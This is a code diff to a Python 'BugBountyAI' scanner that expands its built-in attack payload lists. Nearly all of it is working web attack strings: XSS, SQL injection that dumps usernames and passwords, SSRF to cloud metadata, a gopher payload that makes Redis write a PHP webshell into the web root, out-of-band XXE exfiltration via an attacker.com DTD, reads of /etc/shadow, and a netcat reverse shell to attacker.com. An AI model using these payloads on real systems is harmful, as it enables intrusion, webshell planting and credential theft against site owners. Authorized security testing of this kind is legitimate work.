@@ -175,50 +175,88 @@ class BugBountyAI:
         self.payload_generator = pipeline("text-generation", model="gpt2")
         
         self.config = {
-            'max_depth': 10,  # Increased from 5 to 10
-            'threads': 12,    # Increased from 8 to 12
-            'rate_limit_delay': (0.3, 1.5),  # More aggressive scanning
+            'max_depth': 10,
+            'threads': 12,
+            'rate_limit_delay': (0.3, 1.5),
             'test_payloads': {
                 'xss': [
-                    '<script>alert(1)</script>', 
+                    '<script>alert(1)</script>',
                     '<img src=x onerror=alert(1)>',
                     '" onmouseover=alert(1) "',
                     '<svg/onload=alert(1)>',
                     'javascript:alert(1)',
                     '"><script>alert(1)</script>',
-                    '"><iframe src="javascript:alert(1)">'
+                    '"><iframe src="javascript:alert(1)">',
+                    '<body onload=alert(1)>',
+                    '<iframe src="javascript:alert(1)"></iframe>',
+                    '<a href="javascript:alert(1)">click</a>',
+                    '<details/open/ontoggle=alert(1)>',
+                    '<video><source onerror=alert(1)>'
                 ],
                 'sqli': [
-                    "' OR '1'='1", 
-                    "' OR 1=1--", 
-                    '" OR "1"="1', 
+                    "' OR '1'='1",
+                    "' OR 1=1--",
+                    '" OR "1"="1',
                     'admin"--',
                     '1;SELECT * FROM users',
-                    '1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))'
+                    '1 AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))',
+                    "' OR SLEEP(5)--",
+                    "' UNION SELECT null,username,password FROM users--",
+                    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)--",
+                    "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT USER()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
+                    "' OR EXISTS(SELECT * FROM information_schema.tables)--"
                 ],
                 'idor': [
-                    '/api/user/1', 
-                    '/admin/../user/2', 
-                    '/profile/2', 
+                    '/api/user/1',
+                    '/admin/../user/2',
+                    '/profile/2',
                     '/account/3',
                     '/api/v1/users/1',
-                    '/admin/user/1/profile'
+                    '/admin/user/1/profile',
+                    '/api/users/12345',
+                    '/admin/accounts/1',
+                    '/private/files/1',
+                    '/download?file=../../../../etc/passwd',
+                    '/api/v2/users/1/delete'
                 ],
                 'ssrf': [
-                    'http://127.0.0.1', 
-                    'http://localhost', 
+                    'http://127.0.0.1',
+                    'http://localhost',
                     'http://169.254.169.254/latest/meta-data/',
                     'http://internal.service',
-                    'file:///etc/passwd'
+                    'file:///etc/passwd',
+                    'http://localhost:8080',
+                    'http://127.0.0.1:3306',
+                    'http://169.254.169.254/latest/user-data/',
+                    'http://metadata.google.internal/computeMetadata/v1/',
+                    'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$30%0d%0a%0a%0a%3Cscript%3Ealert(1)%3C/script%3E%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/www/html/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
                 ],
                 'xxe': [
                     '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
-                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service">]>'
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.service">]>',
+                    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;%send;]>',
+                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/shadow"> %xxe;]>',
+                    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>'
                 ],
                 'lfi': [
                     '../../../../etc/passwd',
                     '....//....//....//etc/passwd',
-                    '%2e%2e%2f%2e%2e%2fetc%2fpasswd'
+                    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+                    '/etc/shadow',
+                    '/proc/self/environ',
+                    '/var/log/auth.log',
+                    'php://filter/convert.base64-encode/resource=index.php',
+                    '....\\....\\....\\windows\\win.ini'
+                ],
+                'command_injection': [
+                    ';id',
+                    '|id',
+                    '`id`',
+                    '$(id)',
+                    '|| id',
+                    '&& id',
+                    '; cat /etc/passwd',
+                    '| nc attacker.com 4444 -e /bin/sh'
                 ]
             },
             'detailed_reporting': True
